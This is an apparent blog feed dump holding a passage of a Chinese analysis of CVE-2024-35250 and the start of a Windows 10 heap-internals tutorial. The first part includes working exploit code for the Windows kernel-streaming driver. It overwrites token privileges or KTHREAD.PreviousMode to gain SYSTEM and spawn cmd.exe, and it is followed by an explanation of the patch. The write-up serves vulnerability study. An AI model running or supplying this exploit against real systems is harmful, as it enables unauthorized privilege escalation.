Current KTHREAD address: %llx\n&quot;</span>, Curthread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());</span><br><span class="line"><span class="keyword">if</span> (hCurproc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curproc, GetCurrentProcessId(), hCurproc);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current EPROCESS address: %llx\n&quot;</span>, Curproc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize input buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pInBufProperty-&gt;Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pInBufProperty-&gt;Flags = KSPROPERTY_TYPE_UNSERIALIZESET;</span><br><span class="line">pInBufProperty-&gt;Id = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Initialize output buffer</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pSerialHdr-&gt;PropertySet = KSPROPSETID_DrmAudioStream;</span><br><span class="line"></span><br><span class="line">pSerialHdr-&gt;Count = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">pSerial-&gt;PropertyLength = <span class="keyword">sizeof</span>(EXPLOIT_DATA1);</span><br><span class="line">pSerial-&gt;Id = <span class="number">0x0</span>;                <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Set = KSPROPSETID_DrmAudioStream;</span><br><span class="line">pSerial-&gt;PropTypeSet.Flags = <span class="number">0x0</span>; <span class="comment">// Should be null</span></span><br><span class="line">pSerial-&gt;PropTypeSet.Id = <span class="number">0x45</span>;   <span class="comment">// Irrelevant value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Intialize fake property data</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">uint64_t</span> ntoskrnl_user_base = <span class="number">0</span>;</span><br><span class="line">HMODULE outModule = <span class="number">0</span>;</span><br><span class="line">UINT_PTR ntoskrnlBase = GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] ntoskrnl.exe base address = %llx\n&quot;</span>, ntoskrnlBase);</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap = (PRTL_BITMAP)AllocateBitmap(<span class="keyword">sizeof</span>(RTL_BITMAP), Ptr64(<span class="number">0x10000000</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting TOKEN.Privileges fields technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It should be (0x20 * n) to overwrite (n/2 * 0x8) bytes at arbitrary address</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span> * <span class="number">4</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = Ptr64(ktoken_obj + TOKEN_PRIV_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = Ptr64(leak_gadget_address(<span class="string">&quot;RtlSetAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlSetAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// FakeBitmap initialization for the overwriting KTHREAD.PreviousMode field technique</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;SizeOfBitMap = <span class="number">0x20</span>;</span><br><span class="line">pOutBufPropertyData-&gt;FakeBitmap-&gt;Buffer = Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621);</span><br><span class="line">pInBufPropertyData-&gt;ptr_ArbitraryFunCall = Ptr64(leak_gadget_address(<span class="string">&quot;RtlClearAllBits&quot;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] RtlClearAllBits kernel address = %p\n&quot;</span>, pInBufPropertyData-&gt;ptr_ArbitraryFunCall);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Send property request to trigger the vulnerability</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">res = SendIoctlReq(hDevice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] SendIoctlReq failed\n&quot;</span>); <span class="comment">// It&#x27;s ok to see this message if exploit succeded</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, GetPidByName(<span class="string">L&quot;winlogon.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hWinLogon)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed with error = %lx\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CreateProcessFromHandle(hWinLogon, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Leveraging DKOM to achieve LPE\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Calling Write64 wrapper to overwrite current EPROCESS-&gt;Token\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">KPROCESSOR_MODE mode = UserMode; <span class="comment">// We set UserMode in restoring thread state phase to avoid BSOD in further process creations</span></span><br><span class="line"></span><br><span class="line">Write64(Ptr64(Curproc + EPROCESS_TOKEN_WIN_11_22H2_22621), Ptr64(Sysproc + EPROCESS_TOKEN_WIN_11_22H2_22621), TOKEN_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Restoring KTHREAD.PreviousMode phase</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Write64(Ptr64(Curthread + PREV_MODE_WIN_11_22H2_22621), &amp;mode, <span class="keyword">sizeof</span>(mode));</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Spawn the shell with &quot;nt authority\system&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提权之前的过程就是设置各个属性以及标志位让执行流成功到达目的代码, 并触发函数调用, 遇之前的漏洞描述符合一致</p><p>该poc除了原文提到的提权方案之外, 还提供了一个类似的, 共两种提权方式</p><ul><li>一种是上面提到的使用RtlSetAllBits修改_SEP_TOKEN_PRIVILEGES直接开启所有权限, 然后打开一个高权限进程并以这个进程句柄为父句柄创建新进程</li><li>还有一种是通过RtlClearAllBits将_ETHREAD.PreviousMode改为0, 从而有权限调用NtWriteVirtualMemory进行内核空间任意写, 替换Token,  在启动新进程之前还原回UserMode, 避免system触发BSOD</li></ul><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>修复方案在<code>ks!KspPropertyHandler</code>函数中</p><p><strong>修复之前</strong><br><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_163829.png" alt=""></p><p>解析到对应的KsProperty_flag为<code>KSPROPERTY_TYPE_SERIALIZESET</code>或者<code>KSPROPERTY_TYPE_UNSERIALIZESET</code>就直接调用对应函数</p><p><strong>修复之后</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_164129.png" alt=""></p><p>可以看到在调用之前增加了条件检查</p><p>除非满足<code>Feature_3118115132__private_IsEnabledDeviceUsage</code>函数返回True, 而大多数时候显然并不会</p><p>否则就比较<code>pInBufProperty-&gt;Set</code>是否为<code>KSPROPSETID_DrmAudioStream</code>, <strong>不相等</strong>才继续调用函数执行</p><p>而<code>pInBufProperty-&gt;Set == KSPROPSETID_DrmAudioStream</code>却是在<code>ksthunk!CheckIrpForStackAdjustmentNative</code>函数中触发函数调用点的前提<br><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_164803.png" alt=""></p>]]></content>
    
    
    <summary type="html">CVE-2024-35250</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows用户态堆分析</title>
    <link href="https://ixout.github.io/posts/51089/"/>
    <id>https://ixout.github.io/posts/51089/</id>
    <published>2025-03-20T07:26:53.000Z</published>
    <updated>2025-03-27T07:51:22.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>一直偷懒, 没遇到winheap相关利用场景, 所以一直拖着没有学习winheap相关知识, 结果面试时遇到直接尬住</p><p>与linux不同, 由于windows闭源的原因, 要想阅读源码只能通过反编译的方式, 这显然不利于学习, 但好在网络上有一群热爱分享的前辈已经整理好了许多相关的知识</p><p>之前已经学习过linux下的glibc_ptmalloc2和kernel_slab内存管理器模型, 学习了许多利用方式, 在windows下会发现, 其实本质上并没有过于巨大的差异, 有前者的基础能很好的帮助理解winheap</p><h1 id="Win10Heap"><a href="#Win10Heap" class="headerlink" title="Win10Heap"></a>Win10Heap</h1><p>glibc会随着时代在进步, 显然windows更不会原地踏步, win98, winxp, win7, win10的堆内存管理肯定是存在差异的</p><p>尽管现在依然有许多win老设备坚挺在一线, 但win10/11才应该算是更贴近时代的, 所以我们从win10开始切入</p><p>Angel Boy有一篇slide专门用于讲解win10下heap的利用, 十分适合从零开始的winheap学习</p><p>win10下的内存管理器较为复杂, 主要可以被归为两类</p><ol><li>NT Heap<ul><li>默认的内存管理器</li></ul></li><li>SegmentHeap<ul><li>win10新增的内存管理器</li><li>部分系统程序以及UWP(Universal Windows Platform)使用</li></ul></li></ol><h2 id="NT-Heap"><a href="#NT-Heap" class="headerlink" title="NT_Heap"></a>NT_Heap</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-20_224616.png" alt=""></p><p>NT_Heap可以分为两个部分</p><ol><li>back_end, 后端分配器是主要的堆管理结构, 负责大多数内存管理操作</li><li>front_end, 前端分配器为了提高小块内存分配的速度, 对高频小内存分配进行优化, Windows 使用 <strong>LFH(Low Fragmentation Heap)</strong> 作为主要的前端分配器</li></ol><h3 id="Back-End"><a href="#Back-End" class="headerlink" title="Back-End"></a>Back-End</h3><p>让我们从后端开始, 一切开始之前先让我们知道windows堆是如何描述堆和chunk的</p><p>结构体声明来自<a href="https://www.vergiliusproject.com/">https://www.vergiliusproject.com/</a></p><h4 id="结构描述"><a href="#结构描述" class="headerlink" title="结构描述"></a>结构描述</h4><h5 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_UNPACKED_ENTRY</span> <span class="title">UnpackedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* PreviousBlockPrivateData;                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT Size;                                            <span class="comment">//0x8</span></span><br><span class="line">                    UCHAR Flags;                                            <span class="comment">//0xa</span></span><br><span class="line">                    UCHAR SmallTagIndex;                                    <span class="comment">//0xb</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG SubSegmentCode;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT PreviousSize;                                    <span class="comment">//0xc</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        UCHAR SegmentOffset;                                <span class="comment">//0xe</span></span><br><span class="line">                        UCHAR LFHFlags;                                     <span class="comment">//0xe</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                    UCHAR UnusedBytes;                                      <span class="comment">//0xf</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG CompactHeader;                                    <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_EXTENDED_ENTRY</span> <span class="title">ExtendedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* Reserved;                                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT FunctionIndex;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT ContextValue;                                    <span class="comment">//0xa</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONG InterceptorValue;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            USHORT UnusedBytesLength;                                       <span class="comment">//0xc</span></span><br><span class="line">            UCHAR EntryOffset;                                              <span class="comment">//0xe</span></span><br><span class="line">            UCHAR ExtendedBlockSignature;                                   <span class="comment">//0xf</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* ReservedForAlignment;                                     <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG Code1;                                            <span class="comment">//0x8</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                        &#123;</span></span><br><span class="line">                            USHORT Code2;                                   <span class="comment">//0xc</span></span><br><span class="line">                            UCHAR Code3;                                    <span class="comment">//0xe</span></span><br><span class="line">                            UCHAR Code4;                                    <span class="comment">//0xf</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                        ULONG Code234;                                      <span class="comment">//0xc</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG AgregateCode;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>看着很长, 但实际上会根据多种因素决定取用哪部分</p><p>对于一个后端chunk可能有以下几种状态</p><ul><li><code>Inused chunk</code></li><li><code>Freed chunk</code></li><li><code>VirtualAlloc chunk</code></li></ul><p>与linux类似, 也是头部 + User Data, 对于一个最普通的后端chunk其状态如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint2B Size;</span><br><span class="line">    Uchar Flags;</span><br><span class="line">    Uchar SmallTagIndex;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>PreviousBlockPrivateData</code>,  与ptmalloc2类似, 基本上存储前一个chunk的数据, 但空闲时不会存储前一个chunk的size</li><li><code>Size</code>,  因为chunk是十六字节对齐存储当前chunk的<code>size &gt;&gt; 4</code></li><li><code>Flags</code>, 当前chunk的标志: <ul><li><code>0x1</code>表示处于占用状态</li><li><code>0x2</code>表示存在额外描述</li><li><code>0x4</code>表示使用固定模式填充</li><li><code>0x8</code>表示VirtualAlloc</li><li><code>0x10</code>表示为该段最后一个chunk</li></ul></li><li><code>SmallTagIndex</code>, <code>Size</code>和<code>Flags</code>成员三字节数据逐个xor结果, 取出时会进行校验</li><li><code>PreviousSize</code>, 上一个chunk的size, 同样是右移4位</li><li><code>SegmentOffset</code>, 某些情况用于查找segment</li><li><code>Unusedbyte</code>, 两种情况<ul><li>在inuse的时候, 表示<code>malloc</code>之后剩下的chunk的空间大小, 可以用来判断chunk是来自于Front-End还是Back-End</li><li>在freed的时候, 恒为0</li></ul></li><li><code>UserData</code>, 用户使用的区域, 类似的在freed状态下会存储<code>Flink</code>和<code>Blink</code>分别指向前一个和后一个chunk, 但指向的是chunk的用户区域</li></ul><h5 id="HEAP-VIRTUAL-ALLOC-ENTRY"><a href="#HEAP-VIRTUAL-ALLOC-ENTRY" class="headerlink" title="_HEAP_VIRTUAL_ALLOC_ENTRY"></a>_HEAP_VIRTUAL_ALLOC_ENTRY</h5><p>该结构体用于描述通过VirtualAlloc得到的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x40 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_VIRTUAL_ALLOC_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">Entry</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span> <span class="title">ExtraStuff</span>;</span>                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONGLONG CommitSize;                                                   <span class="comment">//0x20</span></span><br><span class="line">    ULONGLONG ReserveSize;                                                  <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">BusyBlock</span>;</span>                                           <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><ul><li><code>Entry</code> ,就是一个Flink和Blink, 分别指向上一个和下一个VirtualAlloc得到的chunk</li><li>中间三个字段, 暂时不做过多理会</li><li><code>BusyBlock</code>, 与普通的<code>_HEAP_ENTRY</code>头基本一样, 不同在于这里的<code>Size</code>是没有使用的size, 储存时也没有进行<code>size &gt;&gt; 4</code>的操作, UnusedBytes恒为4</li></ul><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><p>接下来要知道的是这些chunk是被哪个结构管理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* 